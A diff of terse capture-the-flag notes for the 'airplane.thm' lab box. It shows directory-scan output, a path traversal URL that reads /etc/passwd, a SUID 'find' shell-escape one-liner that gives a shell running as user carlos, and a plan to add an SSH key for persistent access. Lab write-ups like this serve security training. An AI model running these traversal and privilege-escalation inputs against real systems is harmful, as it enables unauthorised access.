@@ -32,7 +32,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /airplane             (Status: 200) [Size: 655]
 
 ### Found Path Traversal 
-http://airplane.thm:8000/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+`http://airplane.thm:8000/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
 
 carlos:x:1000: nothing
 hudson:x:1001: get some files from home folder
@@ -50,10 +50,8 @@ run linpeas and
 -rwsr-xr-x 1 carlos carlos 313K Feb 18  2020 /usr/bin/find     
 
 
-hudson@airplane:/$ ./usr/bin/find . -exec /bin/sh -p \; -quit
-./usr/bin/find . -exec /bin/sh -p \; -quit
+hudson@airplane:/$` ./usr/bin/find . -exec /bin/sh -p \; -quit`
 $ id
-id
 uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
 
 Have access to hudson home folder create own ssh key get full ssh access as **carlos**
